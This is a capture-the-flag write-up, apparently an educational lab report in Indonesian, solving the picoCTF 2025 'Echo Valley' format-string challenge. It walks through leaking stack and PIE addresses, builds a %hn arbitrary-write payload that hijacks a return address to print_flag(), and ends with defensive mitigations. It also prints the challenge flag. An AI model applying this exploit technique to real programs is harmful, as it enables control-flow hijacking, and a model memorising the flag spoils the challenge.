# 485 - Echo Valley (Binary Exploitation, picoCTF 2025, Medium)

## Challenge Metadata
- ID: 485 | Event: picoCTF 2025
- Category: Binary Exploitation | Difficulty: Medium (2)
- Author: LT 'syreal' Jones
- Points: 200 Pts
- Flag: `academy{f1ckl3_f0rmat_f1asc0}`

## Problem Statement & Scope
Binary target x86_64 ELF (`valley`) menyimulasikan sistem gema suara (*echo*) interaktif berbasis terminal di mana pengguna dapat meneriakkan teks berulang kali ke lembah hingga memasukkan perintah `exit`.
Deskripsi menyatakan:
*"Sightseeing in the valley is fun, shouting is even more fun! I wonder how much fun shouting in the echo valley is! Additional details will be available after launching your challenge instance."*

Objektif pengujian (NIST SP 800-115 / OWASP Top 10 A03:2021-Injection / CWE-134 Use of Externally-Controlled Format String):
Melakukan audit biner terhadap mekanisme pemformatan string pada fungsi gema, mengekstrak informasi sensitif memori (*information disclosure*) untuk mengatasi proteksi PIE dan ASLR, menyusun payload penulisan memori arbitrer (*arbitrary memory write*) menggunakan specifier format `%hn`, membajak alur eksekusi (*control flow hijacking*) ke fungsi `print_flag()`, dan mengambil token flag lab.

## Teori & Analisis Arsitektur Kerentanan
1. **Mitigasi Biner Target:**
   - Stack Canary: Aktif (`__stack_chk_fail`)
   - NX (No-Execute Stack): Aktif
   - PIE (Position Independent Executable): Aktif
   - RELRO: Partial RELRO
2. **Format String Vulnerability (`CWE-134`):**
   Pada fungsi `echo_valley`, buffer input `char buf[100]` dibaca dari `stdin` menggunakan `fgets` dan dicetak langsung tanpa format string penentu tipe:
   ```c
   printf("You heard in the distance: ");
   printf(buf);
   fflush(stdout);
   ```
   Penggunaan `printf(buf)` yang tidak terkontrol memungkinkan penyerang membaca dan menulis memori stack menggunakan specifier format `%p`, `%s`, dan `%n`/`%hn`.
3. **Analisis Stack Layout & Pointer Leak:**
   - Argument ke-6 pada ABI x86_64 berkorespondensi dengan awal buffer `buf` pada stack (`%rsp+0`).
   - Argument ke-20 (`%20$p`) menyimpan nilai *saved frame pointer* (RBP) dari fungsi pemanggil `main`.
   - Argument ke-21 (`%21$p`) menyimpan alamat instruksi kembali ke `main` (`main+18`, offset PIE `0x1413`).
   - Dengan membocorkan argumen 21, alamat basis biner dapat dihitung secara dinamis:
     `pie_base = ret_main - 0x1413`
   - Alamat target fungsi pemenang `print_flag` berada pada offset `0x1269`:
     `print_flag_addr = pie_base + 0x1269`
4. **Arbitrary Write Menggunakan Positional Format String:**
   - Alamat lokasi return address `echo_valley` pada stack berada tepat di `main_rbp - 8`.
   - Karena proteksi glibc mensyaratkan konsistensi penentu posisi (*positional parameter syntax*), semua penentu format harus menggunakan notasi `$`: `%1$<target_val>c%8$hn`.
   - Argumen ke-8 stack (`%rsp+16`) dialokasikan untuk menyimpan pointer 64-bit target `main_rbp - 8`.
   - Modifikasi 2-byte bawah (*short write* via `%hn`) mengubah alamat kembali dari instruksi `main+18` ke `print_flag()`.
   - Pengiriman string `exit\n` memicu keluarnya loop `echo_valley` dan mengeksekusi instruksi `leave; ret`, mengalihkan eksekusi secara mulus ke `print_flag()`.

## Rekonstruksi Eksploitasi Step-by-Step
1. Tahap 1 — Probing Status & Inisiasi Layanan Lab:
   - Mengaktifkan kontainer challenge melalui endpoint CyLab: `PUT /api/challenges/485/instance/`.
   - Mendapatkan alamat socket TCP: `chatelaine.cylabacademy.net:33642`.
2. Tahap 2 — Memory Leak (RBP & PIE Base):
   - Mengirimkan string input `%20$p.%21$p\n`.
   - Menerima respons: `You heard in the distance: 0x7ffd51ead620.0x58f9765d2413`.
   - Menghitung `pie_base = 0x58f9765d2413 - 0x1413 = 0x58f9765d1000`.
   - Menghitung target: `print_flag_addr = 0x58f9765d2269` (low 16-bit = `0x2269` = 8809).
   - Menghitung lokasi return pointer pada stack: `ret_addr_loc = 0x7ffd51ead620 - 8 = 0x7ffd51ead618`.
3. Tahap 3 — Memory Corruption & Control Flow Hijack:
   - Menyusun payload pemformatan memori:
     `fmt = "%1$8809c%8$hn"` (panjang 13 byte), diikuti padding 3 byte `AAA`, dan alamat `0x7ffd51ead618` dikemas secara little-endian (8 byte).
   - Mengirim payload ke layanan jaringan.
4. Tahap 4 — Triggering Execution & Flag Recovery:
   - Mengirim perintah `exit\n` ke socket target.
   - Program mencetak teks `"The Valley Disappears"` diikuti eksekusi `print_flag()`:
     `Congrats! Here is your flag: academy{f1ckl3_f0rmat_f1asc0}`.
5. Tahap 5 — Validasi Platform:
   - Mengirim token flag ke REST API CyLab: `POST /api/submissions/` dengan payload:
     `{"challenge": 485, "flag": "academy{f1ckl3_f0rmat_f1asc0}"}`.
   - Respons platform: `HTTP 201 Created` (`correct: true`, user 1072359).
   - Mengirim permintaan `DELETE /api/challenges/485/instance/` untuk membersihkan kontainer lab.

## Flag & Bukti Verifikasi
- Flag Resmi: `academy{f1ckl3_f0rmat_f1asc0}`
- Bukti Validasi: REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created (`correct: true`, user 1072359).

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Hardened Format String Syntax:** Selalu sediakan string format literal konstan pada fungsi variadic output seperti `printf("%s", buf)` dan jangan pernah meneruskan buffer dinamis sebagai format specifier.
- **Kompilasi dengan Fortify Source:** Aktifkan proteksi `-D_FORTIFY_SOURCE=2` atau `-D_FORTIFY_SOURCE=3` bersama `-Wformat -Wformat-security -Werror=format-security` pada GCC/Clang untuk mendeteksi dan memblokir penulisan `%n` pada buffer dinamis saat kompilasi maupun runtime.
- **Full RELRO Protection:** Gunakan opsi kompilasi `-Wl,-z,relro,-z,now` untuk memastikan seluruh tabel relokasi (GOT) bersifat *read-only* setelah proses inisialisasi.